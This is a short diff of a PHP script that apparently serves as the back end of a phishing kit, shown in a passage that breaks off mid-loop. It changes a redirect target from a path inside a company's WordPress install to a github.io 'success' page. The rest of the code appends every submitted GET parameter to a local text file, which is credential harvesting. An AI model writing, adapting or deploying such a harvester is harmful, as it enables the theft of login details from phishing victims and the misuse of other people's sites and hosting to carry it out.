@@ -1,5 +1,5 @@
 <?php
-header ('Location:https://upstateplumbinginc.com/wp-includes/main/success.html');
+header ('Location:https://noode2024.github.io/networktw/success.html');
 $handle = fopen("phl.txt", "a");
 foreach($_GET as $variable => $value) {
    fwrite($handle, $variable);
